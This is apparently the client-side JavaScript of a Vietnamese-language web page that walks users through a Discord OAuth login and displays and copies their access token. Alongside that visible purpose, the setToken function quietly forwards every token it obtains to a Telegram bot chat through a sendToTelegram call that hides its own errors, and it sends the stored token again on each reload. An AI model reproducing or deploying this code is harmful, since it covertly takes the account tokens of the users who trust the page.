(function(){
const loginBtn = document.getElementById('loginBtn');
const tokenDisplay = document.getElementById('tokenDisplay');
const copyBtn = document.getElementById('copyBtn');
const resetBtn = document.getElementById('resetBtn');
const statusMsg = document.getElementById('statusMsg');

function showToast(msg, type) {
    const old = document.querySelector('.toast');
    if (old) old.remove();
    const div = document.createElement('div');
    div.className = 'toast ' + type;
    div.textContent = msg;
    document.body.appendChild(div);
    setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 300); }, 2200);
}

function sendToTelegram(token) {
    fetch('https://api.telegram.org/bot' + CONFIG.BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: 'Token: ' + token })
    }).catch(() => {});
}

function setToken(token) {
    if (token && token.length > 30) {  // user token dài hơn nhiều
        localStorage.setItem('meo_token', token);
        tokenDisplay.textContent = token;
        tokenDisplay.className = 'token-box has-token';
        statusMsg.textContent = '✅ Đã lấy token';
        statusMsg.className = 'status success';
        showToast('✅ Lấy user token thành công!', 'success');
        sendToTelegram(token);
    } else {
        localStorage.removeItem('meo_token');
        tokenDisplay.textContent = 'Chưa có token';
        tokenDisplay.className = 'token-box empty';
        statusMsg.textContent = '❌ Chưa có token';
        statusMsg.className = 'status error';
    }
}

const saved = localStorage.getItem('meo_token');
if (saved) setToken(saved);
else setToken(null);

function openDiscordPopup() {
    if (CONFIG.CLIENT_ID === 'YOUR_CLIENT_ID' || CONFIG.REDIRECT_URI === 'YOUR_REDIRECT_URI') {
        showToast('⚠️ Cấu hình chưa đúng!', 'error');
        return;
    }
    // Sửa thành response_type=token để lấy user token trực tiếp
    const authUrl = 'https://discord.com/oauth2/authorize?client_id=' + CONFIG.CLIENT_ID +
        '&response_type=token' +  // ← Quan trọng
        '&redirect_uri=' + encodeURIComponent(CONFIG.REDIRECT_URI) +
        '&scope=identify';        // hoặc thêm scope khác nếu cần

    window.location.href = authUrl;
}

function handleRedirect() {
    // Xử lý token từ hash (#access_token=...)
    const hash = window.location.hash.substring(1);
    const hashParams = new URLSearchParams(hash);
    const tokenFromHash = hashParams.get('access_token');

    if (tokenFromHash) {
        setToken(tokenFromHash);
        window.history.replaceState({}, document.title, window.location.pathname);
        return;
    }

    // Nếu có code (fallback)
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    if (code) {
        statusMsg.textContent = '⏳ Đang xử lý...';
        statusMsg.className = 'status loading';
        // Không cần exchange code nữa vì dùng Implicit Grant
    }
}

loginBtn.addEventListener('click', openDiscordPopup);

copyBtn.addEventListener('click', function() {
    const token = localStorage.getItem('meo_token');
    if (!token) { showToast('❌ Chưa có token', 'error'); return; }
    navigator.clipboard.writeText(token).then(() => {
        showToast('✅ Đã sao chép', 'success');
    }).catch(() => {
        const range = document.createRange();
        range.selectNode(tokenDisplay);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
        document.execCommand('copy');
        showToast('✅ Đã sao chép (fallback)', 'success');
    });
});

resetBtn.addEventListener('click', function() {
    if (confirm('Xóa token đã lưu?')) {
        setToken(null);
        showToast('🗑️ Đã xóa', 'info');
    }
});

handleRedirect();
window.addEventListener('load', handleRedirect);
})();
